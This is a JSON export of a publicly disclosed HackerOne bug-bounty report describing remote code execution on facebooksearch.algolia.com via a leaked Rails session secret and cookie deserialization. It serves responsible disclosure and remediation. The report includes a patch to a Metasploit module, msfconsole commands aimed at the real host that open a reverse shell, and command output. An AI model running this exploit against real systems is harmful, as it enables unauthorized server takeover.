{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2016-09-01T15:23:52.927Z", 
    "voters": [
        "derision", 
        "michiel", 
        "spam404", 
        "hunter", 
        "dawgyg", 
        "mak", 
        "koenrh", 
        "reactors08", 
        "yaworsk", 
        "zombiehelp54", 
        "and 45 more..."
    ], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "500.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 134321, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": null, 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "RCE on facebooksearch.algolia.com", 
    "is_member_of_team?": null, 
    "vote_count": 55, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2016-10-01T15:23:53.070Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$500", 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2016-04-25T05:57:18.176Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-25T05:57:18.176Z", 
            "actor": {
                "username": "michiel", 
                "url": "/michiel", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/007/148ca8ec6766a1b0e556fcb6202947a5084069df_medium.png?1395443047"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "algolia", 
            "message": "I now realize the file I created - http://facebooksearch.algolia.com/hackerone.txt - is gone again. Maybe there are multiple app servers and I created the file on only one app server? (Look in `public/` for a file called `hackerone.txt`.)", 
            "markdown_message": "<p>I now realize the file I created - <a title=\"http://facebooksearch.algolia.com/hackerone.txt\" href=\"/redirect?signature=8261d781687f64e307fb30f2dbc04dc4c75feb7c&amp;url=http%3A%2F%2Ffacebooksearch.algolia.com%2Fhackerone.txt\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://facebooksearch.algolia.com/hackerone.txt</span><i class=\"icon-external-link\"></i></a> - is gone again. Maybe there are multiple app servers and I created the file on only one app server? (Look in <code>public/</code> for a file called <code>hackerone.txt</code>.)</p>\n", 
            "type": "Activities::Comment", 
            "id": 925512, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-04-25T05:59:06.517Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-25T05:59:06.517Z", 
            "actor": {
                "username": "adams", 
                "url": "/adams", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/012/053/674321f512b07d0b8c75f9180c1fce11d8c257a6_medium.jpg?1438507587"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "algolia", 
            "message": "Thank you for the report. We investigate.", 
            "markdown_message": "<p>Thank you for the report. We investigate.</p>\n", 
            "type": "Activities::Comment", 
            "id": 925515, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-04-25T06:36:34.241Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-25T06:36:34.241Z", 
            "actor": {
                "username": "michiel", 
                "url": "/michiel", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/007/148ca8ec6766a1b0e556fcb6202947a5084069df_medium.png?1395443047"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "algolia", 
            "message": "The linked blog is dead. Here's a similar post explaining the concept: http://robertheaton.com/2013/07/22/how-to-hack-a-rails-app-using-its-secret-token/. \n\nLet me know if you need anything else. ", 
            "markdown_message": "<p>The linked blog is dead. Here&#39;s a similar post explaining the concept: <a title=\"http://robertheaton.com/2013/07/22/how-to-hack-a-rails-app-using-its-secret-token/\" href=\"/redirect?signature=3f6c29fe3dcc9b444d617bfb21b7695277eb465b&amp;url=http%3A%2F%2Frobertheaton.com%2F2013%2F07%2F22%2Fhow-to-hack-a-rails-app-using-its-secret-token%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://robertheaton.com/2013/07/22/how-to-hack-a-rails-app-using-its-secret-token/</span><i class=\"icon-external-link\"></i></a>. </p>\n\n<p>Let me know if you need anything else. </p>\n", 
            "type": "Activities::Comment", 
            "id": 925534, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-04-25T06:52:52.044Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-25T06:52:52.044Z", 
            "actor": {
                "username": "adams", 
                "url": "/adams", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/012/053/674321f512b07d0b8c75f9180c1fce11d8c257a6_medium.jpg?1438507587"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "algolia", 
            "message": "Thank you for the update @michiel", 
            "markdown_message": "<p>Thank you for the update <a href=\"/michiel\">@michiel</a></p>\n", 
            "type": "Activities::Comment", 
            "id": 925551, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-04-25T06:59:08.517Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-25T06:59:08.517Z", 
            "actor": {
                "username": "adams", 
                "url": "/adams", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/012/053/674321f512b07d0b8c75f9180c1fce11d8c257a6_medium.jpg?1438507587"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "algolia", 
            "message": "I confirm the file is present. Since there are multiple servers running the app, the request might not show it every time.", 
            "markdown_message": "<p>I confirm the file is present. Since there are multiple servers running the app, the request might not show it every time.</p>\n", 
            "type": "Activities::BugTriaged", 
            "id": 925555, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-04-25T16:23:35.208Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-25T16:23:35.208Z", 
            "actor": {
                "username": "michiel", 
                "url": "/michiel", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/007/148ca8ec6766a1b0e556fcb6202947a5084069df_medium.png?1395443047"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "algolia", 
            "message": "I noticed you took down the website temporarily as a precaution. Good!", 
            "markdown_message": "<p>I noticed you took down the website temporarily as a precaution. Good!</p>\n", 
            "type": "Activities::Comment", 
            "id": 926385, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-04-26T07:31:20.881Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-26T07:31:20.881Z", 
            "actor": {
                "username": "adams", 
                "url": "/adams", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/012/053/674321f512b07d0b8c75f9180c1fce11d8c257a6_medium.jpg?1438507587"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "algolia", 
            "message": "Yes, it was an old application that we did not maintain anymore and it turned out to be the weak spot.", 
            "markdown_message": "<p>Yes, it was an old application that we did not maintain anymore and it turned out to be the weak spot.</p>\n", 
            "type": "Activities::Comment", 
            "id": 927807, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "michiel", 
                "url": "/michiel"
            }, 
            "created_at": "2016-04-29T10:25:25.766Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-29T10:25:25.766Z", 
            "actor": {
                "username": "adams", 
                "url": "/adams", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/012/053/674321f512b07d0b8c75f9180c1fce11d8c257a6_medium.jpg?1438507587"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "algolia", 
            "message": "After a discussion with the dev team, it has been decided that the application will stay down. We have checked all our other Rails applications and those are safe. Thank you for your help, it's much appreciated.", 
            "markdown_message": "<p>After a discussion with the dev team, it has been decided that the application will stay down. We have checked all our other Rails applications and those are safe. Thank you for your help, it&#39;s much appreciated.</p>\n", 
            "type": "Activities::BugResolved", 
            "id": 933377, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-04-29T15:19:37.790Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-29T15:19:37.790Z", 
            "actor": {
                "username": "michiel", 
                "url": "/michiel", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/007/148ca8ec6766a1b0e556fcb6202947a5084069df_medium.png?1395443047"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "algolia", 
            "message": "Thank you for addressing the problem so fast! Is this in scope for the bounty program?", 
            "markdown_message": "<p>Thank you for addressing the problem so fast! Is this in scope for the bounty program?</p>\n", 
            "type": "Activities::Comment", 
            "id": 933730, 
            "genius_execution_id": null
        }, 
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2016-04-29T15:27:55.242Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-29T15:27:55.242Z", 
            "actor": {
                "url": "/algolia", 
                "profile": {
                    "name": "Algolia"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/443/aea99e8de90abf447f941c9a7936ead51a6ee03f_medium.png?1501262446"
                }
            }, 
            "team_handle": "algolia", 
            "bounty_amount": "500.0", 
            "collaborator": {
                "username": "michiel", 
                "url": "/michiel"
            }, 
            "message": "Yes. Although the bug is out of scope of our program, we have decided to award a bounty. Thank you for your help!", 
            "markdown_message": "<p>Yes. Although the bug is out of scope of our program, we have decided to award a bounty. Thank you for your help!</p>\n", 
            "type": "Activities::BountyAwarded", 
            "id": 933745, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-09-01T15:23:52.989Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-09-01T15:23:52.989Z", 
            "actor": {
                "username": "michiel", 
                "url": "/michiel", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/007/148ca8ec6766a1b0e556fcb6202947a5084069df_medium.png?1395443047"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "algolia", 
            "first_to_agree": true, 
            "message": "Since you guys handled this report so well and fast, I'd like to disclose this report and show how well the @algolia team handles vuln reports. Do you mind public disclosure? ", 
            "markdown_message": "<p>Since you guys handled this report so well and fast, I&#39;d like to disclose this report and show how well the <a href=\"/algolia\">@algolia</a> team handles vuln reports. Do you mind public disclosure? </p>\n", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1167690, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-10-01T15:24:10.343Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-10-01T15:24:10.343Z", 
            "actor": {
                "url": "/algolia", 
                "profile": {
                    "name": "Algolia"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/443/aea99e8de90abf447f941c9a7936ead51a6ee03f_medium.png?1501262446"
                }
            }, 
            "team_handle": "algolia", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 1227464, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "michiel", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/michiel", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/007/269edb3bb231ea102c6e6ed5a4fed0965ef828d1_small.png?1395443047"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 70, 
        "name": "Code Injection"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -68801063.85821511, 
    "disclosed_at": "2016-10-01T15:24:10.322Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/134321", 
    "created_at": "2016-04-25T05:47:36.506Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p>While doing recon on Algolia, I found that the session secret for facebooksearch.algolia.com has been committed to a <strong>public</strong> GitHub repository. Since the Rails app running at <code>facebooksearch.algolia.com</code> is using <code>CookieStore</code> as the session storage, this means an attacker knowing the session secret can craft any cookie that will then be accepted by the server.</p>\n\n<p>Cookie values are deserialized (unmarshalled) server-side. That combined with knowing the session secret creates the dangerous opportunity for an RCE. The attacker can sign a cookie that contains a Ruby object that evals arbitrary code when it is deserialized on the server side. The concept is explained in depth here: <a title=\"https://charlie.bz/blog/rails-3.2.10-remote-code-execution\" href=\"/redirect?signature=cb87d021bef675b67f63d3de0c96bf9c32dcd737&amp;url=https%3A%2F%2Fcharlie.bz%2Fblog%2Frails-3.2.10-remote-code-execution\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://charlie.bz/blog/rails-3.2.10-remote-code-execution</span><i class=\"icon-external-link\"></i></a>. </p>\n\n<h1 id=\"where-did-i-find-the-session-secret\">Where did I find the session secret?</h1>\n\n<p>I used <a href=\"/redirect?signature=93363f8c775156a6ab34f7616997debffe0df485&amp;url=https%3A%2F%2Fgithub.com%2Fmichenriksen%2Fgitrob\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>Gitrob</span><i class=\"icon-external-link\"></i></a> to scan all of Algolia&#39;s public repositories (plus repositories from employees) and extract everything that is interesting. The <code>secret_token.rb</code> initializer immediately caught my attention since it usually contains the <code>secret_key_base</code>, which should never be public. </p>\n\n<p>The token can be found here: <a title=\"https://github.com/algolia/facebook-search/commit/f3adccb5532898f8088f90eb57cf991e2d499b49#diff-afe98573d9aad940bb0f531ea55734f8R12\" href=\"/redirect?signature=35ce88bd84dc047498d48befbf5a76f1c8c98f03&amp;url=https%3A%2F%2Fgithub.com%2Falgolia%2Ffacebook-search%2Fcommit%2Ff3adccb5532898f8088f90eb57cf991e2d499b49%23diff-afe98573d9aad940bb0f531ea55734f8R12\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/algolia/facebook-search/commit/f3adccb5532898f8088f90eb57cf991e2d499b49#diff-afe98573d9aad940bb0f531ea55734f8R12</span><i class=\"icon-external-link\"></i></a></p>\n\n<h1 id=\"proof-of-concept\">Proof of Concept</h1>\n\n<p><a href=\"/joernchen\">@joernchen</a> developed a ready to go proof of concept for this vulnerability and submitted it to the <a href=\"/redirect?signature=1b54e51d66363513fe3d21b135fa020a7e445dd2&amp;url=http%3A%2F%2Fwww.darkoperator.com%2Finstalling-metasploit-in-ubunt%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>Metasploit Framework</span><i class=\"icon-external-link\"></i></a>: <a title=\"https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/rails_secret_deserialization.rb\" href=\"/redirect?signature=3761cf54cc17da33c488423929034277dfa9f921&amp;url=https%3A%2F%2Fgithub.com%2Frapid7%2Fmetasploit-framework%2Fblob%2Fmaster%2Fmodules%2Fexploits%2Fmulti%2Fhttp%2Frails_secret_deserialization.rb\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/rails_secret_deserialization.rb</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>Since the version of the exploit doesn&#39;t take cookies with <code>-</code> into account, here is a small patch to allow the exploit to work on the <code>_facebook-search_session</code> cookie. Here&#39;s the patch for the exploit: </p>\n<pre class=\"highlight diff\"><code>     if res &amp;&amp; !res.get_cookies.empty?\n<span class=\"gd\">-      match = res.get_cookies.match(/([_A-Za-z0-9]+)=([A-Za-z0-9%]*)--([0-9A-Fa-f]+);/)\n</span><span class=\"gi\">+      match = res.get_cookies.match(/([_A-Za-z0-9\\-]+)=([A-Za-z0-9%]*)--([0-9A-Fa-f]+);/)\n</span>     end\n</code></pre>\n<p>With that patch applied, you can run the PoC from <code>msfconsole</code> by following these commands:</p>\n<pre class=\"highlight shell\"><code><span class=\"c\"># setting up</span>\nuse exploit/multi/http/rails_secret_deserialization\n<span class=\"nb\">set </span>secret <span class=\"s2\">&quot;&lt;grab-from-github-url&gt;&quot;</span>\n<span class=\"nb\">set </span>rhost facebooksearch.algolia.com\n<span class=\"nb\">set </span>railsversion 4\n<span class=\"nb\">set </span>targeturi /auth/facebook\n\n<span class=\"c\"># and then run</span>\nexploit\n\n<span class=\"c\"># when successful, a reverse shell will be established</span>\n<span class=\"c\"># this allows you to run arbitrary commands</span>\n</code></pre>\n<p>As a proof of concept, I ran <code>id</code>:</p>\n<pre class=\"highlight plaintext\"><code>id\nuid=1000(prod) gid=1000(prod) groups=1000(prod)\n</code></pre>\n<p>But since that is very generic, I also created <a title=\"http://facebooksearch.algolia.com/hackerone.txt\" href=\"/redirect?signature=8261d781687f64e307fb30f2dbc04dc4c75feb7c&amp;url=http%3A%2F%2Ffacebooksearch.algolia.com%2Fhackerone.txt\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://facebooksearch.algolia.com/hackerone.txt</span><i class=\"icon-external-link\"></i></a> with the text &quot;PoC by michiel&quot; to proof regular write access is possible as well. </p>\n\n<h1 id=\"remediation\">Remediation</h1>\n\n<p>Switch <code>config/initializers/secret_token.rb</code> to use an environment variable (e.g. <code>ENV[&#39;SECRET_KEY_BASE&#39;]</code>). You must also generate a new token because the current secret is compromised. A new secret can be generated by running <code>rake secret</code> from the command line. Make sure the new secret does not leak in git commit history. </p>\n", 
    "vulnerability_information": "While doing recon on Algolia, I found that the session secret for facebooksearch.algolia.com has been committed to a **public** GitHub repository. Since the Rails app running at `facebooksearch.algolia.com` is using `CookieStore` as the session storage, this means an attacker knowing the session secret can craft any cookie that will then be accepted by the server.\n\nCookie values are deserialized (unmarshalled) server-side. That combined with knowing the session secret creates the dangerous opportunity for an RCE. The attacker can sign a cookie that contains a Ruby object that evals arbitrary code when it is deserialized on the server side. The concept is explained in depth here: https://charlie.bz/blog/rails-3.2.10-remote-code-execution. \n\n# Where did I find the session secret?\nI used [Gitrob](https://github.com/michenriksen/gitrob) to scan all of Algolia's public repositories (plus repositories from employees) and extract everything that is interesting. The `secret_token.rb` initializer immediately caught my attention since it usually contains the `secret_key_base`, which should never be public. \n\nThe token can be found here: https://github.com/algolia/facebook-search/commit/f3adccb5532898f8088f90eb57cf991e2d499b49#diff-afe98573d9aad940bb0f531ea55734f8R12\n\n# Proof of Concept\n@joernchen developed a ready to go proof of concept for this vulnerability and submitted it to the [Metasploit Framework](http://www.darkoperator.com/installing-metasploit-in-ubunt/): https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/rails_secret_deserialization.rb\n\nSince the version of the exploit doesn't take cookies with `-` into account, here is a small patch to allow the exploit to work on the `_facebook-search_session` cookie. Here's the patch for the exploit: \n\n```diff\n     if res && !res.get_cookies.empty?\n-      match = res.get_cookies.match(/([_A-Za-z0-9]+)=([A-Za-z0-9%]*)--([0-9A-Fa-f]+);/)\n+      match = res.get_cookies.match(/([_A-Za-z0-9\\-]+)=([A-Za-z0-9%]*)--([0-9A-Fa-f]+);/)\n     end\n```\n\nWith that patch applied, you can run the PoC from `msfconsole` by following these commands:\n\n```bash\n# setting up\nuse exploit/multi/http/rails_secret_deserialization\nset secret \"<grab-from-github-url>\"\nset rhost facebooksearch.algolia.com\nset railsversion 4\nset targeturi /auth/facebook\n\n# and then run\nexploit\n\n# when successful, a reverse shell will be established\n# this allows you to run arbitrary commands\n```\n\nAs a proof of concept, I ran `id`:\n\n```\nid\nuid=1000(prod) gid=1000(prod) groups=1000(prod)\n```\n\nBut since that is very generic, I also created http://facebooksearch.algolia.com/hackerone.txt with the text \"PoC by michiel\" to proof regular write access is possible as well. \n\n# Remediation\nSwitch `config/initializers/secret_token.rb` to use an environment variable (e.g. `ENV['SECRET_KEY_BASE']`). You must also generate a new token because the current secret is compromised. A new secret can be generated by running `rake secret` from the command line. Make sure the new secret does not leak in git commit history. \n\n", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://algolia.com", 
            "about": "Hosted search API that delivers instant and relevant results from the first keystroke", 
            "twitter_handle": "algolia", 
            "name": "Algolia"
        }, 
        "handle": "algolia", 
        "url": "https://hackerone.com/algolia", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/443/e5b082d816c5ab9f060fed192e8c6e436b74a4ef_small.png?1501262446", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/000/443/aea99e8de90abf447f941c9a7936ead51a6ee03f_medium.png?1501262446"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 443, 
        "default_currency": "usd"
    }, 
    "is_published": false
}